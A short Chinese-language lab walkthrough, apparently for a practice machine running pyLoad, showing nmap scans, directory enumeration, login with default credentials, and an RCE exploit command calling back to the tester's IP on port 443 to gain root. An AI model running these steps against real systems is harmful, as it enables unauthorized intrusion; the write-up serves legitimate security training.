针对目标服务器进行相应的端口扫描

```
sudo nmap -p- -vvv --min-rate 10000 192.168.190.26
```

![image-20241201204357974](https://s2.loli.net/2024/12/01/ygfm6arvPXsU73D.png)

针对开放的端口进行服务探测

```
sudo nmap -p22,9666 -A 192.168.190.26 -oG PyLoader.txt
```

![image-20241201204409127](https://s2.loli.net/2024/12/01/cS4DFsEVILmhRKx.png)

22端口没有可以直接利用的漏洞内容，关注9666端口的http服务内容，优先针对http进行目录及文件探测

```
dirsearch -u http://192.168.190.26:9666
```

![image-20241201210306412](https://s2.loli.net/2024/12/01/FfVTGNQsEq56UoP.png)

同时我们搜索pyload的默认账号密码及可以使用的漏洞

![image-20241201205311270](https://s2.loli.net/2024/12/01/UZW1bgIderus5VK.png)

我们根据搜索到的默认账号密码进行登录操作

![image-20241201205329834](https://s2.loli.net/2024/12/01/oqxV9CvDFMAk4cE.png)

结果成功登录获得了权限，在对应info界面获得相应的版本信息

![image-20241201205604799](https://s2.loli.net/2024/12/01/9XAyq6cnv2dZ7Em.png)

![image-20241201205643486](https://s2.loli.net/2024/12/01/gNn765yJkaXmKSj.png)

发现对应的版本存在一个RCE漏洞，我们尝试进行利用

```
python3 exploit.py -t http://192.168.190.26:9666/ -I 192.168.45.197 -P 443 
```

![image-20241201210204323](https://s2.loli.net/2024/12/01/bfiOs9ULaleQBky.png)

直接获取了对应的root权限
